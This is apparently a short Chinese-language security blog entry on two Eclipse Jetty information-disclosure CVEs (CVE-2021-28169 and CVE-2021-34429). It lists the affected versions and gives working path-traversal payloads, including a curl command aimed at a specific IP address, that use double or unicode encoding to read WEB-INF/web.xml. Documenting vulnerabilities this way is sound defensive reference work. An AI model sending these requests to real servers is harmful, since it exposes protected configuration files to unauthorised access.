---
title: "Jetty"
date: 2026-01-30
updated: 2026-01-30
tags:
  - Others
categories:
  - Others
description: None
---
## CVE-2021-28169

信息泄露

> <= 9.4.40、<= 10.0.2、<= 11.0.2 的 Eclipse Jetty

对带有双重编码路径的 ConcatServlet 的请求可以访问 WEB-INF 目录中的受保护资源。

例如，对 `/static?/%2557EB-INF/web.xml` 的请求可以检索 web.xml 文件。

```bash
curl -v http://123.58.224.8:16187/static?/%2557EB-INF/web.xml
# 双重编码绕过
```

## CVE-2021-34429

信息泄露

> 9.4.37-9.4.42、10.0.1-10.0.5 和 11.0.1-11.0.5 的 Eclipse Jetty 版本

使用一些编码字符来制作 URI 以访问 WEB-INF 目录的内容和/或绕过一些安全限制。

访问 `/%u002e/WEB-INF/web.xml` 可以绕过安全限制，读取到 webxml 内容